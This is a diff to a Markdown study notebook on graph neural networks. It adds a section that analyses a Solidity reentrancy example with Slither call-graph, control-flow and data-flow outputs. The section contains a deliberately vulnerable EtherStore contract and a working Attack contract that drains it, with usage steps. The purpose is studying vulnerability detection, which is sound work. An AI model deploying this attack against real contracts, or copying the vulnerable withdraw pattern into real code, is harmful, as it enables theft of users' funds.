@@ -16,20 +16,23 @@
 			- [1.1.3.1. Breadth First Traversal for a Graph](#1131-breadth-first-traversal-for-a-graph)
 			- [1.1.3.2. Depth First Traversal for a Graph](#1132-depth-first-traversal-for-a-graph)
 	- [1.2. Day 2](#12-day-2)
-	- [1.3. Application](#13-application)
-	- [1.4. Library](#14-library)
-		- [1.4.1. Breadth First Traversal for a Graph](#141-breadth-first-traversal-for-a-graph)
-		- [1.4.2. Depth First Traversal for a Graph](#142-depth-first-traversal-for-a-graph)
-	- [1.5. Tutorial Representation Learning on Networks](#15-tutorial-representation-learning-on-networks)
-	- [1.6. Tutorial GNN](#16-tutorial-gnn)
-		- [1.6.1. Node embeddings](#161-node-embeddings)
-		- [1.6.2. Graph neural networks](#162-graph-neural-networks)
-	- [1.7. Graph Neural Network - A literature review and applications](#17-graph-neural-network---a-literature-review-and-applications)
-	- [1.8. Graph Neural Network and Some of GNN Applications: Everything You Need to Know](#18-graph-neural-network-and-some-of-gnn-applications-everything-you-need-to-know)
-	- [1.9. Creating Message Passing Networks](#19-creating-message-passing-networks)
-	- [1.10. Computational Graph in PyTorch](#110-computational-graph-in-pytorch)
-	- [1.11. GCN](#111-gcn)
-	- [1.12. pytorch\_geometric.nn](#112-pytorch_geometricnn)
+		- [1.2.1. Call Graph - Solidity](#121-call-graph---solidity)
+		- [1.2.2. Control Flow Graph - Solidity](#122-control-flow-graph---solidity)
+		- [1.2.3. Data Flow Graph - Solidity](#123-data-flow-graph---solidity)
+		- [1.2.4. Inheritance Graph](#124-inheritance-graph)
+	- [1.3. Day 3 - Slither Tool](#13-day-3---slither-tool)
+	- [1.4. Application](#14-application)
+	- [1.5. Library](#15-library)
+	- [1.6. Tutorial Representation Learning on Networks](#16-tutorial-representation-learning-on-networks)
+	- [1.7. Tutorial GNN](#17-tutorial-gnn)
+		- [1.7.1. Node embeddings](#171-node-embeddings)
+		- [1.7.2. Graph neural networks](#172-graph-neural-networks)
+	- [1.8. Graph Neural Network - A literature review and applications](#18-graph-neural-network---a-literature-review-and-applications)
+	- [1.9. Graph Neural Network and Some of GNN Applications: Everything You Need to Know](#19-graph-neural-network-and-some-of-gnn-applications-everything-you-need-to-know)
+	- [1.10. Creating Message Passing Networks](#110-creating-message-passing-networks)
+	- [1.11. Computational Graph in PyTorch](#111-computational-graph-in-pytorch)
+	- [1.12. GCN](#112-gcn)
+	- [1.13. pytorch\_geometric.nn](#113-pytorch_geometricnn)
 
 
 ## 1.1. Day 1
@@ -323,8 +326,315 @@ if __name__ == "__main__":
 ```
 ## 1.2. Day 2
 
-## 1.3. Application
-## 1.4. Library 
+- Example contract (Reentrancy)
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
+
+/*
+EtherStore is a contract where you can deposit and withdraw ETH.
+This contract is vulnerable to re-entrancy attack.
+Let's see why.
+
+1. Deploy EtherStore
+2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
+3. Deploy Attack with address of EtherStore
+4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
+   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
+   plus 1 Ether sent from this contract).
+
+What happened?
+Attack was able to call EtherStore.withdraw multiple times before
+EtherStore.withdraw finished executing.
+
+Here is how the functions were called
+- Attack.attack
+- EtherStore.deposit
+- EtherStore.withdraw
+- Attack fallback (receives 1 Ether)
+- EtherStore.withdraw
+- Attack.fallback (receives 1 Ether)
+- EtherStore.withdraw
+- Attack fallback (receives 1 Ether)
+*/
+
+contract EtherStore {
+    mapping(address => uint) public balances;
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() public {
+        uint bal = balances[msg.sender];
+        require(bal > 0);
+
+        (bool sent, ) = msg.sender.call{value: bal}("");
+        require(sent, "Failed to send Ether");
+
+        balances[msg.sender] = 0;
+    }
+
+    // Helper function to check the balance of this contract
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+
+contract Attack {
+    EtherStore public etherStore;
+
+    constructor(address _etherStoreAddress) {
+        etherStore = EtherStore(_etherStoreAddress);
+    }
+
+    // Fallback is called when EtherStore sends Ether to this contract.
+    fallback() external payable {
+        if (address(etherStore).balance >= 1 ether) {
+            etherStore.withdraw();
+        }
+    }
+
+    function attack() external payable {
+        require(msg.value >= 1 ether);
+        etherStore.deposit{value: 1 ether}();
+        etherStore.withdraw();
+    }
+
+    // Helper function to check the balance of this contract
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+
+```
+- Description:
+  - Two contract:
+    - EtherStore
+    - Attack
+  - Function in Contract
+    - EtherStore
+      - withdraw()
+    - Attack
+      - attack() 
+  - Vulnerability
+    - Reentrancy
+  - Contract version: 0.8.17
+
+### 1.2.1. Call Graph - Solidity
+- Example 
+![Call-graph](Asset/20230606123654.png)
+
+:pushpin: Example reentrancy
+
+- contract EtherStore
+
+![Call-graph reentrancy attack](Asset/20230606125023.png)
+
+- Contract Attack
+
+![Call-graph reentrancy attack](Asset/20230606125121.png)
+
+- Combine (EtherStore and Attack)
+
+![EtherStore - Attack](Asset/20230606125212.png)
+
+:pushpin: .dot file
+
+```
+strict digraph {
+subgraph cluster_69_EtherStore {
+label = "EtherStore"
+"69_getBalance" [label="getBalance"]
+"69_withdraw" [label="withdraw"]
+"69_deposit" [label="deposit"]
+}subgraph cluster_solidity {
+label = "[Solidity]"
+"require(bool)" 
+"require(bool,string)" 
+"balance(address)" 
+"69_withdraw" -> "require(bool)"
+"69_getBalance" -> "balance(address)"
+"69_withdraw" -> "require(bool,string)"
+}
+}
+```
+
+```
+strict digraph {
+subgraph cluster_138_Attack {
+label = "Attack"
+"138_attack" [label="attack"]
+"138_constructor" [label="constructor"]
+"138_fallback" [label="fallback"]
+"138_getBalance" [label="getBalance"]
+}subgraph cluster_solidity {
+label = "[Solidity]"
+"require(bool)" 
+"balance(address)" 
+"138_attack" -> "require(bool)"
+"138_fallback" -> "balance(address)"
+"138_getBalance" -> "balance(address)"
+}
+}
+```
+
+```
+strict digraph {
+subgraph cluster_138_Attack {
+label = "Attack"
+"138_attack" [label="attack"]
+"138_constructor" [label="constructor"]
+"138_fallback" [label="fallback"]
+"138_getBalance" [label="getBalance"]
+}subgraph cluster_69_EtherStore {
+label = "EtherStore"
+"69_getBalance" [label="getBalance"]
+"69_withdraw" [label="withdraw"]
+"69_deposit" [label="deposit"]
+}subgraph cluster_solidity {
+label = "[Solidity]"
+"require(bool)" 
+"require(bool,string)" 
+"balance(address)" 
+"69_withdraw" -> "require(bool)"
+"138_getBalance" -> "balance(address)"
+"69_getBalance" -> "balance(address)"
+"69_withdraw" -> "require(bool,string)"
+"138_attack" -> "require(bool)"
+"138_fallback" -> "balance(address)"
+}"138_attack" -> "69_withdraw"
+"138_attack" -> "69_deposit"
+"138_fallback" -> "69_withdraw"
+}
+```
+
+
+### 1.2.2. Control Flow Graph - Solidity
+
+![Attack-attack()](Asset/20230606125525.png)
+
+![Attack-constructor()](Asset/20230606125604.png)
+
+![Attack-fallback()](Asset/20230606125632.png)
+
+![Attack-getBalance()](Asset/20230606125655.png)
+
+![EtherStore-deposit()](Asset/20230606125727.png)
+
+![EtherStore-getBalance()](Asset/20230606125801.png)
+
+![EtherStore-withdraw()](Asset/20230606125841.png)
+
+:pushpin: .dot file
+
+### 1.2.3. Data Flow Graph - Solidity
+
+```
+INFO:Printers:
+Contract EtherStore
++----------+---------------------------+
+| Variable |        Dependencies       |
++----------+---------------------------+
+| balances | ['balances', 'msg.value'] |
++----------+---------------------------+
+
+Function deposit()
++---------------------+---------------------------+
+|       Variable      |        Dependencies       |
++---------------------+---------------------------+
+| EtherStore.balances | ['balances', 'msg.value'] |
++---------------------+---------------------------+
+Function withdraw()
++---------------------+----------------------------------------------+
+|       Variable      |                 Dependencies                 |
++---------------------+----------------------------------------------+
+|         bal         |                 ['balances']                 |
+|         sent        | ['TUPLE_0', 'bal', 'balances', 'msg.sender'] |
+| EtherStore.balances |                 ['balances']                 |
++---------------------+----------------------------------------------+
+Function getBalance()
++---------------------+--------------+
+|       Variable      | Dependencies |
++---------------------+--------------+
+|                     |      []      |
+| EtherStore.balances |      []      |
++---------------------+--------------+
+INFO:Printers:
+Contract EtherStore
++----------+---------------------------+
+| Variable |        Dependencies       |
++----------+---------------------------+
+| balances | ['balances', 'msg.value'] |
++----------+---------------------------+
+
+Function deposit()
++---------------------+---------------------------+
+|       Variable      |        Dependencies       |
++---------------------+---------------------------+
+| EtherStore.balances | ['balances', 'msg.value'] |
++---------------------+---------------------------+
+Function withdraw()
++---------------------+----------------------------------------------+
+|       Variable      |                 Dependencies                 |
++---------------------+----------------------------------------------+
+|         bal         |                 ['balances']                 |
+|         sent        | ['TUPLE_0', 'bal', 'balances', 'msg.sender'] |
+| EtherStore.balances |                 ['balances']                 |
++---------------------+----------------------------------------------+
+Function getBalance()
++---------------------+--------------+
+|       Variable      | Dependencies |
++---------------------+--------------+
+|                     |      []      |
+| EtherStore.balances |      []      |
++---------------------+--------------+
+Contract Attack
++------------+--------------------------------------+
+|  Variable  |             Dependencies             |
++------------+--------------------------------------+
+| etherStore | ['_etherStoreAddress', 'etherStore'] |
++------------+--------------------------------------+
+
+Function constructor(address)
++--------------------+------------------------+
+|      Variable      |      Dependencies      |
++--------------------+------------------------+
+| _etherStoreAddress |           []           |
+| Attack.etherStore  | ['_etherStoreAddress'] |
++--------------------+------------------------+
+Function fallback()
++-------------------+----------------+
+|      Variable     |  Dependencies  |
++-------------------+----------------+
+| Attack.etherStore | ['etherStore'] |
++-------------------+----------------+
+Function attack()
++-------------------+----------------+
+|      Variable     |  Dependencies  |
++-------------------+----------------+
+| Attack.etherStore | ['etherStore'] |
++-------------------+----------------+
+Function getBalance()
++-------------------+--------------+
+|      Variable     | Dependencies |
++-------------------+--------------+
+|                   |      []      |
+| Attack.etherStore |      []      |
++-------------------+--------------+
+```
+### 1.2.4. Inheritance Graph
+
+...updating...
+## 1.3. Day 3 - Slither Tool
+
+- Reference: [Slither documents](https://github.com/crytic/slither/wiki)
+- Script use Slither API in Python
+
+
+## 1.4. Application
+## 1.5. Library 
 
 - Pytorch geometric
 - DGL
@@ -332,42 +642,36 @@ if __name__ == "__main__":
 
 
 
-
-
-### 1.4.1. Breadth First Traversal for a Graph
-
-### 1.4.2. Depth First Traversal for a Graph
-
-## 1.5. Tutorial Representation Learning on Networks
+## 1.6. Tutorial Representation Learning on Networks
 - http://snap.stanford.edu/proj/embeddings-www/
 - Node embeddings -> Map nodes to low-dimensional embeddings 
   - DeepWalk
   - Node2vec
 - Graph neural networks -> Deep Learning architectures for graph-structured data
 
-## 1.6. Tutorial GNN
+## 1.7. Tutorial GNN
 
 - https://drive.google.com/file/d/1rvm6Yq6-Ss4UmxLDIPTReJJkAdcXdhFb/view
 
 
-### 1.6.1. Node embeddings
+### 1.7.1. Node embeddings
 
 ![Node embeddings](Asset/20230606104241.png)
 
 - Random Walk Approaches 
 - node2vec: Biased Walks 
-### 1.6.2. Graph neural networks
+### 1.7.2. Graph neural networks
 - The basics 
 - Graph convolutional networks 
 - GraphSAGE
 - Gated Graph Neural Networks 
 - Subgraph Embeddings 
 
-## 1.7. Graph Neural Network - A literature review and applications
+## 1.8. Graph Neural Network - A literature review and applications
 - https://viblo.asia/p/deep-learning-graph-neural-network-a-literature-review-and-applications-6J3ZgP0qlmB#_node-embedding-6
 
 
-## 1.8. Graph Neural Network and Some of GNN Applications: Everything You Need to Know
+## 1.9. Graph Neural Network and Some of GNN Applications: Everything You Need to Know
 
 - https://neptune.ai/blog/graph-neural-network-and-some-of-gnn-applications
 
@@ -375,20 +679,20 @@ if __name__ == "__main__":
 
 
 
-## 1.9. Creating Message Passing Networks
+## 1.10. Creating Message Passing Networks
 
-## 1.10. Computational Graph in PyTorch
+## 1.11. Computational Graph in PyTorch
 
 - https://www.geeksforgeeks.org/computational-graph-in-pytorch/
 
-## 1.11. GCN 
+## 1.12. GCN 
 
 - https://viblo.asia/p/tan-man-ve-graph-convolution-networks-phan-1-6J3Zga8A5mB
 - https://viblo.asia/p/tan-man-ve-graph-convolution-networks-phan-2-gAm5y7NqZdb
 
 
 
-## 1.12. pytorch_geometric.nn
+## 1.13. pytorch_geometric.nn
 
 - Convolutional Layers 
 - Aggregation Operators 
